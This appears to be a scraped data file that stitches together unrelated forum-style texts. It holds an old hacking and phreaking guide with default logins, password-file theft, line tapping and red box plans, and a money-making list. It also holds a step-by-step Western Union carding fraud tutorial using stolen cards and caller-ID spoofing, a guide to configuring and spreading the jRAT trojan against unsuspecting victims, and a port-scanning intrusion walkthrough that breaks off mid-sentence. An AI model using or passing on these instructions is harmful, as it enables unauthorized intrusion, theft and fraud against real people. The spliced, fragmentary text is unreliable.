Hacking is the act of penetrating computer systems to gain knowledge about the system and how it works. Hacking is illegal because we demand free access to ALL data, and  we get it. This pisses people off and we are outcasted from society, and  in order to stay out of prison, we must keep our status of being a  hacker/phreaker a secret.  We cant discuss our findings with anyone but other members of the hacking/phreaking community for fear of being punished.  We are punished for wanting to learn. Why is the government spending huge amounts of time and money to arrest hackers when there are other much more dangerous people out there. It is the murderers, rapists, terrorists, kidnappers, and burglers who should be punished for what they have done, not hackers.  We do NOT pose a threat to anyone. We are NOT out to hurt people or there computers. I admit that there are some people out there who call themselves hackers and who deliberately damage computers. But these people are criminals, NOT hackers. I dont care what the government says, we are NOT criminals. We are NOT trying to alter or damage any system. This is widely misunderstood. Maybe one day people will believe us when we say that all we want is to learn. There are only two ways to get rid of hackers and phreakers.  One is to get rid of computers and telephones, in which case we would  find other means of getting what we want.(Like that is really going to  happen.) The other way is to give us what we want, which is free access  to ALL information. Until one of those two things happen, we are not  going anywhere. B. Why hack? As said above, we hack to gain knowledge about systems and the way they work. We do NOT want to damage systems in any way. If you do damage a system, you WILL get caught. But, if you dont damage  anything, it is very unlikely that you will be noticed, let alone be  tracked down and arrested, which costs a considerable amount of time  and money. Beginners should read all the files that they can get their hands on about anything even remotely related to hacking and phreaking, BEFORE they start hacking. I know it sounds stupid and boring but it will definetly pay off in the future. The more you read about hacking and phreaking, the more unlikely it is that you will get caught. Some of the most useless pieces of information that you read could turn out to be the most helpful. That is why you need to read everything  possible. C. Hacking rules 1.Never damage any system. This will only get you into trouble. 2.Never alter any of the systems files, except for those needed to insure that you are not detected, and those to insure that you have access into that computer in the future. 3.Do not share any information about your hacking projects with anyone but those youd trust with your life. 4.When posting on BBSs (Bulletin Board Systems) be as vague as possible when describing your current hacking projects.  BBSs CAN be monitered by law enforcement. 5.Never use anyones real name or real phone number when posting on a BBS.  6.Never leave your handle on any systems that you hack in to. 7.DO NOT hack government computers. 8.Never speak about hacking projects over your home telephone line. 9.Be paranoid. Keep all of your hacking materials in a safe place. 10.To become a real hacker, you have to hack. You cant just sit around reading text files and hanging out on BBSs. This is not what hacking is all about. D. Getting started The very first thing you need to do is get a copy of PKZIP  or some other file unzipping utility.  Nearly everything that you download from the Internet or from a BBS will be zipped. A zipped file is a file that has been compressed. Zipped files end with the extension \"".zip\"". Then you need to get yourself a good prefix scanner.(also known as a War Dialer)  This is a program that automatically dials phone  numbers beginning with the three numbers (prefix) that you specify. It  checks to see if the number dialed has a carrier.(series of beeps that  tells you that you have dialed a computer)  Try and find a large  business area prefix to scan. It is these businesses that have  interesting computers.  There are many good scanners out there, but I  would recommend Autoscan or A-Dial. These are very easy to use and get  the job done quickly and efficiently. E. Where and how to start hacking After you get yourself a good scanner, scan some prefixes and find some cool dialups, then do the following:  From your terminal, dial the number you found.  Then you should hear a series of beeps (carrier) which tells you that you are connecting to a remote computer. It should then say something like \""CONNECT 9600\"" and then identify the system that you are on. If nothing happens after it says \""CONNECT 9600\"" try hitting enter a few times. If you get a bunch of garbage adjust your parity, data bits, stop bits, baud rate, etc., until it becomes clear. That is one way of connecting to a remote computer. Another way is through Telenet or some other large network. Telenet is a very large network that has many other networks and  remote computers connected to it. Ok, here is how you would connect to a remote computer through Telenet: First, you get your local dialup(phone number) from the list that I have provided in Section G.  Then you dial the number from your  terminal and connect.(If you get a bunch of garbage try changing your  parity to odd and your data bits to 7, this should clear it up.)  If  it just sits there hit enter and wait a few seconds, then hit enter  again. Then it will say \""TERMINAL=\"" and you type in your terminal emulation. If you dont know what it is just hit enter. Then it will give you a prompt that looks like \""@\"". From there you type \""c\"" and then the NUA (Network User Address) that you want to connect to. After you connect to the NUA, the first thing you need to do is find out what type of system you are on.(i.e. UNIX, VAX/VMS, PRIME, etc.) There are other things that you can do on Telenet besides  connecting to an NUA. Some of these commands and functions are listed in  the next section. You can only connect to computers which accept reverse charging. The only way you can connect to computers that dont accept reverse charging is if you have a Telenet account. You can try hacking these. To do this, at the \""@\"" prompt type \""access\"". It will then ask you for your Telenet ID and password. Telenet is probably the safest place to start hacking because of the large numbers of calls that they get. Make sure you call during business hours (late morning or early afternoon) so there are many other people on-line. F. Telenet commands Here is a list of some Telenet commands and their functions. This is only a partial list.  Beginners probably wont use these commands, but I put them here for reference anyway.

Telenet NUAs Here is a list of a few Telenet NUAs and what type of system they are. But first, this is how an NUA is put together: 031106170023700                   \\   /\\ /  \\ /   |   |    |                   DNIC Area  NUA                        Code   The DNIC says which network connected to Telenet you are using. The area code is the area code for the area that the NUA is in.  And the NUA is the address of the computer on Telenet.  Please note that an NUA does NOT have to be in your area code for you to connect to it. There are two ways of finding useful NUAs.  The first way is to get or write an NUA scanning program.  The second way is to get a copy  of the Legion Of Dooms Telenet Directory.( Volume 4 of the LOD  Technical Journals) Now, here is the list. Remember that these are only a few NUAs. These are NOT all of the Telenet NUAs.  All of these NUAs DO accept reverse charging.  Also, please note that all of these may not be  working by the time you read this and that network congestion frequently makes an NUA inaccessible for a short period of time.

Basic UNIX hacking UNIX is probably the most commonly used operating system on Telenet, and is the easiest to hack since it doesnt record bad login attempts.  You know youve found a UNIX system when it gives you a \""Login\"" prompt, and then a \""Password\"" prompt. To get in you should first try the default logins.(Listed below.) If these dont work try some of the passwords listed in Section M. If these dont work try to find backdoors. These are passwords that may have been put in to allow the programmer (or someone else who could be in a position to make a backdoor) to get access into the system. These are usually not known about by anyone but the individual who made it. Try doing some research on the programmer and other people who helped to make the system. And, if these dont work, just try guessing them. The Login (usually the account holders name) has 1-8 characters and the Password is 6-8 characters. Both can be either letters or numbers, or a combination of the two. Once you get in, you should get a \""$\"" prompt, or some other special character like it. You should only use lower case letters when hacking UNIX, this seems to be standard format. If you type \""man [command]\"" at the prompt, it should list all of the commands for that system. Anyway, here are the default Logins and Passwords: Login:Password: rootroot rootsystem syssys syssystem daemondaemon uucpuucp ttytty testtest unixunix unixtest binbin admadm admadmin adminadm adminadmin sysmansysman sysmansys sysmansystem sysadminsysadmin sysadminsys sysadminsystem sysadminadmin sysadminadm whowho learnlearn uuhostuuhost guestguest hosthost nuucpnuucp rjerje gamesgames gamesplayer sysopsysop rootsysop demodemo Once you are in, the first thing that you need to do is save the password file to your hard drive or to a disk. The password file contains the Logins and Passwords. The passwords are encoded. To get the UNIX password file, depending on what type of UNIX you are in, you can type one of the following things: /etc/passwd or cat /etc/passwd   The first one is the standard command, but there are other commands as well, like the second one. Once you get the password file, it should look like this: john:234abc56:9999:13:John Johnson:/home/dir/john:/bin/john Broken down, this is what the above password file states: Username: john Encrypted Password: 234abc56 User Number: 9999 Group Number: 13 Other Information: John Johnson Home Directory: /home/dir/john Shell: /bin/john If the password file does not show up under one of the above two commands, then it is probably shadowed. The following definition of password shadowing was taken from the alt.2600 hack faq: \""Password shadowing is a security system where the encrypted password field is replaced with a special token and the encrypted password is stored in a seperate file which is not readable by normal system users.\"" If the password file is shadowed, you can find it in one of the following places, depending on the type of UNIX you are using: UNIX System Type:Path:Token: AIX 3/etc/security/passwd   !  or/tcb/auth/files/<first letter of   # username>/<username> A/UX 3.Os/tcb/files/auth/* BSD4.3-Reno/etc/master.passwd   * ConvexOS 10/etc/shadpw   * Convex0S 11/etc/shadow   * DG/UX/etc/tcb/aa/user   * EP/IX/etc/shadow   x HP-UX/.secure/etc/passwd   * IRIX 5/etc/shadow   x Linux 1.1/etc/shadow   * OSF/1/etc/passwd[.dir|.pag]   * SCO UNIX #.2.x/tcb/auth/files/<first letter of   * username>/<username> SunOS 4.1+c2/etc/security/passwd.adjunct   ## SunOS 5.0/etc/shadow    System V 4.0/etc/shadow   x System V 4.2/etc/security/* database    Ultrix 4/etc/auth[.dir|.pag]   * UNICOS /etc/udb   * Some passwords can only be used for a certain amount of time without having to be changed, this is called password aging. In the password file example below, the \""C.a4\"" is the password aging data: bob:123456,C.a4:6348:45:Bob Wilson:/home/dir/bob:/bin/bob The characters in the password aging data stand for the following: 1. Maximum number of weeks a password can be used without changing. 2. Minimum number of weeks a password must be used before being changed. 3&4. Last time password was changed, in number of weeks since 1970. The password aging data can be decoded using the chart below: Character:Number: .0 /1 02 13 24 35 46 57 68 79 810 911 A12 B13 C14 D15 E16 F17 G18 H19 I20 J21 K22 L23 M24 N25 O26 P27 Q28 R29 S30 T31 U32 V33 W34 X35 Y36 Z37 a38 b39 c40 d41 e42 f43 g44 h45 i46 j47 k48 l49 m50 n51 o52 p53 q54 r55 s56 t57 u58 v59 w60 x61 y62 z63 Now, explore the system freely, be careful, and have fun! K. Basic VAX/VMS hacking The VAX system runs the VMS (Virtual Memory System) operating system. You know that you have a VAX system when you get a \""username\"" prompt. Type in capital letters, this seems to be standard on VAXs. Type \""HELP\"" and it gives you all of the help that you could possibly want. Here are the default usernames and passwords for VAXs: Username:Password: SYSTEMOPERATOR SYSTEMMANAGER SYSTEMSYSTEM SYSTEMSYSLIB OPERATOROPERATOR SYSTESTUETP SYSTESTSYSTEST SYSTESTTEST SYSMAINTSYSMAINT SYSMAINTSERVICE SYSMAINTDIGITAL FIELDFIELD FIELDSERVICE GUESTGUEST GUESTunpassworded DEMODEMO DEMOunpassworded TESTTEST DECNETDECNET Here are some of the VAX/VMS commands: Command:Function: HELP (H)Gives help and list of commands. TYPE (T)View contents of a file. RENAME (REN)Change name of a file. PURGE (PU) Deletes old versions of a file. PRINT (PR)Prints a file. DIRECTORY (DIR)Shows list of files. DIFFERENCES(DIF)Shows differences between files. CREATE (CR)Creates a file. DELETE (DEL)Deletes a file. COPY (COP)Copy a file to another. CONTINUE ©Continues session. The password file on VAXs are available when you type in the command: SYS$SYSTEM:SYSUAF.DAT The password file on most VAXs are usually not available to normal system users, but try it anyway. If the default logins dont work, use the same means of finding one as stated in Section J. Be VERY careful when hacking VAXs becuase they record every bad login attempt. They are sometimes considered one of the most secure systems. Because of this, I advise not to try hacking these until you are more advanced. But, when you are an advanced hacker, or if you are already an advanced hacker, I advise that you try a few passwords at a time and then wait and try a few more the next day and so on, because when the real user logs on it displays all of the bad login attempts. L. Basic PRIME hacking PRIME computer systems greet you with \""Primecon 18.23.05\"", or something like it, when you connect. You should type in capital letters on this system, too. Once you connect, it will usually just sit there. If this happens, type \""LOGIN <USERNAME>\"". It should then ask you for your username and password. The default usernames and passwords are listed below: Username:Password: PRIMEPRIME PRIMEPRIMOS PRIMOSPRIMOS PRIMOSPRIME PRIMOS_CSPRIME PRIMOS_CSPRIMOS PRIMENETPRIMENET SYSTEMSYSTEM SYSTEMPRIME SYSTEMPRIMOS NETLINKNETLINK TESTTEST GUESTGUEST GUEST1 GUEST When you are inside the system, type \""NETLINK\"" and it ahould give you alot of help. This system uses NUAs, too. I might print these in the next volume. M. Password List The password list was taken from A Novices Guide To Hacking, by The Legion Of Doom, and from some of my own discoveries. Here is the list of commonly used passwords: Password: aaa academia ada adrian aerobics airplane albany albatross albert alex alexander algebra alias alisa alpha alphabet ama amy analog anchor andy andrea animal answer anything arrow arthur ass asshole athena atmosphere bacchus badass bailey banana bandit banks bass batman beautiful beauty beaver daniel danny dave deb debbie deborah december desire desperate develop diet digital discovery disney dog drought duncan easy eatme edges edwin egghead eileen einstein elephant elizabeth ellen emerald engine engineer enterprise enzyme euclid evelyn extension fairway felicia fender finite format god hello idiot jester john johnny joseph joshua judith juggle julia kathleen kermit kernel knight lambda larry lazarus lee leroy lewis light lisa louis love lynne mac macintosh mack maggot magic malcolm mark markus martin marty marvin matt master maurice maximum merlin mets michael michelle mike minimum nicki nicole rascal really rebecca remote rick reagan robot robotics rolex ronald rose rosebud rosemary roses ruben rules ruth sal saxon scheme scott secret sensor serenity sex shark sharon shit shiva shuttle simon simple singer single singing smile smooch smother snatch snoopy soap socrates spit spring subway success summer super support surfer suzanne tangerine tape target taylor telephone temptation tiger tigger toggle tomato toyota trivial unhappy unicorn unknown urchin utility vicki virgin virginia warren water weenie whatnot whitney will william winston willie wizard wonbat yosemite zap N. Connecting modems to different phone lines  Ok, if you are really paranoid (or smart) and you dont want to hack from your house for fear of getting caught, you can hook up your modem to other peoples phone lines or to payphones. If you want to hook your modem to a payphone, do it late at night and at a very secluded payphone. Look along either side of the phone. You should see a small metal tube (which contains the telephone wires) running along the wall. Somewhere along the tube it should widen out into a small box. Pop off the boxes lid and there is a nice little phone jack for ya. Taking off the lid may be difficult because they are usually pretty secure, but nothing is impossible, so keep trying. Of course, you can only do this with a lap-top computer. Now, if you want to hook up the modem to someones house or appartment phone line, you need to get a pair of red and green alligator clips, and an extra modem cord for your lap-top. After you get those parts, cut the plastic end off of your modem cord and you will see a red wire, a green wire, and two other wires, but you can ignore those. Attach the red alligator clip to the red wire, and attach the green alligator clip to the green wire and youre all set. Now all you need to do is go find a telephone pole or one of those small green boxes that stick out of the ground.(They should have a Bell Systems logo on them.) On a telephone pole open the little box that has a bunch of wires going to and from it. On the right side of the box you should see what look like two large screws.(These are called \""terminals\"".) One should have a red wire wrapped around it and the other should have a green wire wrapped around it. Attach the red alligator clip the the red wire and the green alligator clip to the green wire, and youre all set. This should get you a dial tone. If it doesnt, make sure that the alligator clips are not touching each other, and that the alligator clips are attached to the exposed end of the wire. Now, on those green boxes you need to undo all of the screws and shit holding the lid on, and open it up. Then you should find basically the same setup as in the telephone pole. Attach the appropriate wires to the appropriate terminals and you are all set.  This process can also be used to hook up a Beige Box (Linemans Handset.) when phreaking. O. Viruses, Trojans, and Worms Just in case some of you are interested, here are the definitions for Viruses, Trojans, and Worms.  These definitions were taken from the alt.2600 hack faq. Trojan: \""Remember the Trojan Horse? Bad guys hid inside it until they could get into the city to do their evil deed. A Trojan computer program is similiar. It is a program which does an unauthorized function, hidden inside an authorized program. It does something other than it claims to do, usually something malicious (although not necessarily!), and it is intended by the author to do whatever it does. If it is not intentional, it is called a bug or, in some cases, a feature :) Some Virus scanning programs detect some Trojans. Some scanning programs dont detect any Trojans. No Virus scanners detect all Trojans.\"" Virus: \""A Virus is an independent program which reproduces itself. It may attach itself to other programs, it may create copies of itself (as in companion Viruses). It may damage or corrupt data, change data, or degrade the performance of your system by utilizing resources such as memory or disk space. Some Viruse scanners detect some Viruses. No Virus scanners detect all Viruses. No Virus scanner can protect against any and all Viruses, known and unknown, now and forevermore.\"" Worm: \""Made famous by Robert Morris, Jr., Worms are programs which reproduce by copying themselves over and over, system to system, using up resources and sometimes slowing down the system. They are self contained and use the networks to spread, in much the same way that Viruses use files to spread. Some people say the solution to Viruses and worms is to just not have any files or networks. They are probably correct. We could include computers.\"" II. PHREAKING A. What is phreaking Phreaking is basically hacking with a telephone. Using different \""boxes\"" and \""tricks\"" to manipulate the phone companies and their phones, you gain many things, two of which are: knowledge about telephones and how they work, and free local and long distance phone calls. In the following sections, you will learn some about boxes, what they are, and how they work. You will also learn about the other forms of phreaking. B. Why phreak? Phreaking, like hacking, is used to gather information about telephones, telephone companies, and how they work. There are other benefits as well. As stated above, you also get free phone calls. But, these are used mainly to gather more information about the phones, and to allow us free access to all information. C. Phreaking rules Most of the same rules apply for hacking and phreaking, so I will only list a few here. 1.Never box over your home phone line. 2.You should never talk about phreaking projects over your home phone line. 3.Never use your real name when phreaking. 4.Be careful who you tell about your phreaking projects. 5.Never leave phreaking materials out in the open. Keep them in a safe place. 6.Dont get caught. D. Where and how to start phreaking Well, you can phreak on any telephone, but as stated above, it is very stupid to do so on your home phone line.  First you need you need to construct the boxes needed for what you want to do. All of the boxes and their descriptions are listed in the next section. Most of the boxes are very easy to make, but if your not into making shit, there are usually alternative ways of making them. E. Boxes and what they do Box:Description: Red Boxgenerates tones for free phone calls Black Boxwhen called, caller pays nothing Beige Boxlinemans handset Green Boxgenerates coin return tones Cheese Boxturns your phone into a payphone Acrylic Boxsteal 3-way calling and other services Aqua Boxstops F.B.I. lock-in-trace Blast Boxphone microphone amplifier Blotto Boxshorts out all phones in your area Blue Boxgenerates 2600hz tone Brown Boxcreates party line Bud Boxtap neighbors phone  Chatreuse Boxuse electricity from phone Chrome Boxmanipulates traffic signals Clear Boxfree calls Color Boxphone conversation recorder Copper Boxcauses crosstalk interference Crimson Boxhold button Dark Boxre-route calls Dayglo Boxconnect to neighbors phone line Divertor Boxre-route calls DLOC Boxcreate party line Gold Boxdialout router Infinity Boxremote activated phone tap Jack Boxtouch-tone key pad Light Boxin-use light Lunch BoxAM transmitter Magenta Boxconnect remote phone line to another Mauve Boxphone tap without cutting into the line Neon Boxexternal microphone Noise Boxcreates line noise Olive Boxexternal ringer Party Boxcreates party line Pearl Boxtone generator Pink Boxcreates party line Purple Boxhold button Rainbow Boxkill trace Razz Boxtap neighbors phone Rock Boxadd music to phone line Scarlet Boxcauses interference Silver Boxcreate DTMF tones for A,B,C, and D Static Boxraises voltage on phone line Switch Boxadd services  Tan Boxphone conversation recorder TV Cable Boxsee sound waves on TV Urine Boxcreate disturbance on phone headset Violet Boxstop payphone from hanging up White BoxDTMF key pad  Yellow Boxadd line extension  F. Box Plans The Red Box is the main tool that you will use so I have included the Red Box plans. The other box plans can be downloaded from the Internet. Red Box: There are two ways that you can make a Red Box: One is to go to Radio Shack and buy a tone dialer and a 6.5536Mhz crystal.(If Radio Shack doesnt have the crystal, you can order them from the electronics companies that I have listed at the end of this section.) Open up the tone dialer and replace the existing crystal (big, shiny, metal thing labeled \""3.579545Mhz\"") with the 6.5536Mhz crystal. Now, close it up. You have a red box.  To use it for long distance calls play the tones that add up to the amount of money that the operator requests. For a 25 cents tone press 5 *s. For a 10 cents tone press 3 *s. For a 5 cents tone press 1 *. And, the second way, which is a much easier method, is to get the Red Box tones from a phreaking program, such as: Omnibox, or Fears Phreaker Tools. Play the tones as you hold a microcassette recorder about 1-inch away from your computer speakers, and record the tones. The Red Box only works on public telephones, it does not work on COCOTs.(Defined in next section.) It makes the telephone think that you have put money in. Red Boxes do not work on local calls because the phone is not using ACTS (Automated Coin Toll System), unless you call the operator and have her place the call for you. You tell her the number that you want to dial and then when she asks you to put in your money, play the tones. If she asks you why you need her to place the call tell her that one of the buttons is smashed in or something like that. You now have and know how to use a Red Box!

Free calling from COCOTs First of all, COCOT stands for \""Customer Owned Customer Operated Telephone\"". These are most likely to be found at resteraunts, amusement parks, etc.  All you have to do to make a free call from a COCOT is dial a 1-800 number (they let you do this for free), say some bullshit and get them to hang up on you. Stay on the line after they hang up, then dial the number that you want to call. This may not work by the time you read this because COCOT owners are becoming more aware of us every day. H. ANAC numbers ANAC stands for \""Automated Number Announcment Circuit\"". In other words, you call the ANAC number in your area and it tells you the number that you are calling from. This is useful when Beige Boxing, or hooking your modem up to other phone lines, to find out what number you are using. The \""?\"" are substituted for unknown numbers. Do some scanning to find them out.

We exist without skin color, without nationality, without religious bias...and you  call us criminals. You build atomic bombs, wage wars, murder, cheat, and lie to us and try to  make us believe it is for our own good, yet were the criminals. Yes, I am a criminal. My crime is that of curiosity. My crime is that of judging people by  what they say and think, not what they look like. My crime is that of outsmarting you, something  that you will never forgive me for. I am a hacker and this is my manifesto. You may stop this  individual, but you cant stop us all...after all, were all alike.\"" +++The Mentor+++ K. Happy hacking! Be careful and have fun.

0	40 Ways to Make Money Online	"""   Infolinks - Infolinks is probably the highest paying option for your in-text advertising. On DLM, you will see underlined links scattered throughout articles. Those are a function of Infolinks and without disclosing too much, its been a great source of income. Best is that they accept all sizes of websites and blogs. Just sign up and begin. Build a Niche Store - This is a simple store development platform which enables you to create content based sites that generate income through the eBay affiliate programs. Pretty darn simple and increasingly popular. Adbrite - Sell space on your site for text ads. This would work like the DLM Marketplace you see on the right of my pages although I chose to manage it myself. Amazon Affiliate Program - Easily create a store or shopping section on your site instead of sending your visitors to Amazon. Amazon handles the shopping cart and fulfillment. Amazon Seller - Sell your stuff on Amazon Associated Content - If you write a story, how-to, rant, how-to cut grass, etc., you can submit it to them and they will pay you $3-$20 per article if they like it. Yahoo! Merchant Solutions - This is a pretty simple and cheap way to create an online store. Azoogleads - Another ad program. They do have some decent companies lined up as advertisers. You provide space, theyll provide an ad. BidVertiser - PPC (pay per click) program with a low $10 payout amount. Blog - Start a blog and consistently write excellent content. With good ad placement, you may make some money. Cafepress - You provide a design, theyll toss it on a T-Shirt, Hat, etc. No upfront costs. Get a free online shop and promote your products on your website. Chitika - Their eMiniMalls service has shown great results for many Bloggers and site owners. You choose a keyword and they show relevant products on your site using a pretty unique interface. Clickbank - Quickly becoming my favorite affiliate program. They have thousands of things for you to advertise on your site. ClicknWork - Get paid $5-$150 per hour for basically doing freelance work on a per-assignment basis. You have to pass a pretty tough test to get in. Clicksor - These are the guys that generate contextual ads on sites that show up when you hover over a double-underlined word. Commission Junction - If you have a site, you can join Commission Junction. Once enrolled for free, you can choose companies whose ads are pertinent to your site. Companies have the ultimate say on working with you. There are easily over 1,000 companies to choose from here. CreamAid - For blogs only, advertisers provide you with a topic and you write about it on your site. To do this, you have to install a flash widget into your blog post. The more people you bring into the conversation through the widget, the more you get paid. Its difficult to explain. eefoof - Think of it as YouTube + Flickr + Music. You add original content and they pay you based on the visitors you attract. Ether - If you are an expert on something, Ether provides a way for people to pay you to talk about it in a one-on-one setting. If you want to charge $250/hr, thats fine. You have to do all the advertising so you should have a blog or site already established. eBay- Come on, you know what this is. Gather your junk and sell it! eBay Stores - If you have a real store and want to sell your stuff online, this is a decent option to get you started. ELance - Name gives it away. Programmers, Codes, Web Designers, Writers, Editors, can look for freelance opportunities. - This is an arm of and is currently only good for Wordpress users. This does me no good currently, but as you can guess, they place ads in your feed(s). Feedburner / Google - Not only are they the best place to house your feeds, they will also add ads to your feed and website. You get paid per impression and if you implement Google Adsense to your feed, you are paid per click. Google Adsense - Come on, you dont need an explanation; these ads are all over the place. Google displays relevant ads based on your sites content Google Adwords - Create simple text ads and choose keywords that determine when they are displayed. This is where the Adsense Content comes from. You do not need a site for this. H3.com - Get paid to fill jobs. Commissions range from $50-$5,000. It all depends on how tough the job is to fill and how desperate the hiring company is. This is another one thats tough to explain. Indeed.com - Add their job board to your site. They then post jobs based on the geographic location of visitors and the position types you pre-select. I tried it and I they continually report that I sent 0 visitors and I know thats not right. Nevertheless, I may have an isolated problem so they make the list. InnerSell - If you have a customer that wants to buy something you cannot sell, you can sell the lead here. Jigsaw - Its a pretty flaky model but if you have a Rolodex full of good contacts, you can sell them here. I cant make sense of it but it looks like you get $0.10 per profile. LinkShare.com - If you have a site, you can join Linkshare. Once enrolled for free, you can choose companies whose ads are pertinent to your site. Companies have the ultimate say on working with you. Like Commission Junction, there are a ton of companies waiting to evaluate your site. Microsoft Adcenter - Bid on keywords and Microsoft places your created ads then they are searched for. This is similar to Google Adwords. You do not need a site for this. Overstock.com - Sell your stuff on Overstock.com Pay Per Post - I dont agree with this model entirely but they have advertisers that will pay you to write about their products on your blog. Pheedo - If you have an RSS feed, run it through Pheedo. Like Feedburner, they can include ads into your feed and if you really become large, advertisers will pay a premium for you to show their ads. Shareasale.com - Ive used them for a couple years for some banner advertising. They are similar to Commission Junction and Linkshare however they seem to have lower tiered companies with advertising offers. Software Judge - They will pay you up to $50 to review software. - I have never made a dime here but I know people that have. You can earn by sending advertisers to them or by selling spots on your site. You must have a real site or blog to do this - nothing on a shared domain (i.e. /blogspot). Vibrant Media - Dont bother unless your site has 500,000 page views of text based content a month. If you have that readership, these are the guys that display bubble box ads to underlined words on your site. West Work At Home Agent - Not entirely online but this is worth a mention because its won awards and is very legitimate. If you are an at-home Mom or free-lancer without work, you should check this out.

0	Western Union Carding	"""   If your always broke like me and you need cash right away the first thing you have to have is 2 valid ccs. You will need 2 because you need 1 to do the actual western union transfer and another to get the tools nessisary to do the transfer. You are going to need the following tools before you go to westernunion.com and transfer money. 1. A complete Background Check of the card holder This is because if you are going to try and transfer anything over $100 dollars USD they will ask you various questions such as your previous address, Social security number, Date of birth, Mothers maiden name, what your middle name is, what bank issued you your credit card, etc. In order to get that kind of infomation you will need to go to a site like peoplefinders.com and it costs about $60 for the infomation you might need for western union. 2. Phone spoofer/voice changer You will need this because western union will think you are a fraudster if you arent calling from the card holders phone number so you must use a phone spoofer service to make the caller id at western union come up with the card holders phone number. Basically trick western union into thinking your calling from the card holders house. The voice changer comes with the phone spoofer service and you need this obviously so your own voice isnt being recorded incase of an investication and also if your a male and your using a females cc to get money from wu you will want to change your voice to sound like a female. 3. Call fowarding service This is something you will need because the phone spoofing service blocks 1800 numbers or any toll free phone number. You can only dial 10 digit numbers with phone spoofers so you have to get a call fowarding service so when you call the 10 digit number from the call forwarding service it will foward to western union. 4. Internet phone service If you are located in europe this is a must because it will cost you too much to use the spoofer and call fowarding service and it is also not traceable. I personally use my pre-paid cell phone but im located in the USA. After you have got that stuff all set up the first thing you need to do is make sure the call fowarding works and the spoofer works and comes up with whatever number you put in for the caller id. When you finally have that all set up and you have your background check all set up then you go to westernunion.com and make the transfer. After you make the transfer it will most likely say something to the affect \""Transfer on hold, Please call Western Union to confirm\"" or something to that effect and you call them up with the caller id/spoofer and call fowarding service. n00bs to this may have some problems and might not be able to pull this off the first 10-15 times but you will get the hang of it like I did. I have done about 13 transfers and only had maybe 6 actually go though for pickup. Another thing you should get is a fake id because that will be the only way to link back to the fraudster in an investication. If you have a fake id and use it to pickup money you will most likely not get caught or it will be very hard to track you down. Remember that you may not be successful your first few times but keep trying and when you do get a successful transfer you will be really happy. Some things I would like to point out is that first check and make sure the card your going to use is valid, I personally use yahoo wallet to verify the cc before I even think of using it. Also, to get spoofing service for caller id/voice changer I use spoofcard.com and for the call fowarding service I use is accessline.com Please REP and Thanks If You LIke This Post Questions are Welcome  ::dance::::dance::::dance::::dance::::dance::::dance::::dance::::dance::::dance::::dance::::dance::::dance:: """
0	Setting up FUD rat jRat from Redpois0n. [Tutorial]	""" Credit to the RAT to Redpois0n, whatever you do with this RAT and my tutorial is your business not mine. Download [HIDE-REPLY] Hidden Content:  You must reply to see links  and press jRAT tab, then download it![/HIDE-REPLY] Hi this is a tutorial for those of you who  dont know how to set up jRat. I will be doing this on a Mac but you  can follow along on Windows or Linux. The RAT is compatible under Java 6 and Java 7 The main GUI looks like this and is coded in 100% Java. 1. Go to the \""Build Tab\"" in one of the 5 main tabs there are including  Adv. Build is your best option to create a server. In general set your connection password and the default encryption is enckey. Remember this password. Switch to the network tab and enter in your credentials including no-ip and your forwarded port. Switch to the Startup tab and Start server with os boot. Then choose the installation path and reg key. If you want a keylogger it will add a 180 bin size. Switch to Allowed os. I will review the necessary things to have for each operating system. Mac: Root priveleges. If you want to find out how to enable Root, then Id suggest you use a magical website called  Hidden Content:  You must reply to see links , but shh, nobody knows about that website. Windows: Java installed, most stable. Linux: Havent tried, but obviously Java installed. Delay: This can be a very good trick to have to keep your slave thinking  he is infected. If you set the delay to 45 seconds and their antivirus  pops up 45 seconds later, they will not think that it is the file you  sent them :D. Final tab:  IMPORTANT: If you want your server to be a jar, the output has to be \""name.jar\"" not \""name\"" it will come out some stupid other file. Now for sockets. Click Add socket and it will take you to this screen:  Socket name doesnt matter as much as what is the other components. :D. Socket Port is self explanatory. (Port you forwarded) Timeout is self explanatory. Enter the connection password you made when creating your server. Enter the key you made when creating the server, default is enckey. You should now be able to get connections. Due to me being on a mac, cba to activate root and infect myself. Features:  Dont rip this on another forum please.   """

0	How To Hack A PC With Just An IP Address	""" So say somehow somewhere we ended up choosing a target to start wreaking havoc upon. All we need is an IP Address. Theres plenty of papers out there that go into how to obtain an IP Address from the preferred mark of your choice. So Im not going to go into that subject. Alright so say we got the targets IP Address finally. What do we do with this IP Address. Well first ping the IP Address to make sure that its alive. In otherwords online. Now at the bottom of this document ill include some links where you can obtain some key tools that may help on your journey through the electronic jungle. So we need to find places to get inside of the computer so we can start trying to find a way to \""hack\"" the box. Port Scanners are used to identify the open ports on a machine thats running on a network, whether its a router, or a desktop computer, they will all have ports. Protocols use these ports to communicate with other services and resources on the network.  1) Blues Port Scanner - This program will scan the IP address that you chose and identify open ports that are on the target box.  Example 1:  Idlescan using Zombie <Domain Name> (192.150.13.111:80); Class: Incremental  Interesting ports on 208.225.90.120:  (The 65522 ports scanned but not shown below are in state: closed)  Port State Service  21/tcp open ftp  25/tcp open smtp  80/tcp open http  111/tcp open sunrpc  135/tcp open loc-srv  443/tcp open https 1027/tcp open IIS  1030/tcp open iad1  2306/tcp open unknown  5631/tcp open pcanywheredata  7937/tcp open unknown  7938/tcp open unknown  36890/tcp open unknown  In example 1 now we see that there are a variety of ports open on this box. Take note of all the ports that you see listed before you. Most of them will be paired up with the type of protocol that uses that port (IE. 80-HTTP 25-SMTP Etc Etc...) Simply take all that information and paste it into notepad or the editor of your choice. This is the beginning of your targets record. So now we know what ports are open. These are all theoretical points of entry where we could wiggle into the computer system. But we all know its not that easy. Alright so we dont even know what type of software or what operating system that this system is running.  2) NMAP - Port Scanner - Has unique OS fingerprinting methods so when the program sees a certain series of ports open it uses its best judgement to guess what operating system its running. Generally correct with my experiences.  So we have to figure out what type of software this box is running if we are gonna start hacking the thing right? Many of you have used TELNET for your MUDS and MOOS and weird multiplayer text dungeons and many of you havent even heard of it before period. TELNET is used to open a remote connection to an IP Address through a Port. So what that means is we are accessing their computer from across the internet, all we need is their IP Address and a port number. With that record you are starting to compile, open a TELNET connection to the IP Address and enter one of the OPEN ports that you found on the target.  So say we typed TELNET -o xxx.xxx.xxx.xxx 25 This command will open up a connection through port 25 to the IP xxx.xxx.xxx.xxx. Now you may see some text at the very top of the screen. You may think, well what the hell, how is that little string of text going to help me. Well get that list you are starting to write, and copy the banners into your compilation of the information youve gathered on your target. Banners/Headers are what you get when you TELNET to the open ports. Heres an example of a banner from port 25.  220 jesus.gha.chartermi.net ESMTP Sendmail 8.12.8/8.12.8; Fri, 7 Oct 2005 01:22:29 -0400  Now this is a very important part in the enumeration process. You notice it says Sendmail 8.12.8/8.12.8 Well what do ya know, we now have discovered a version number. This is 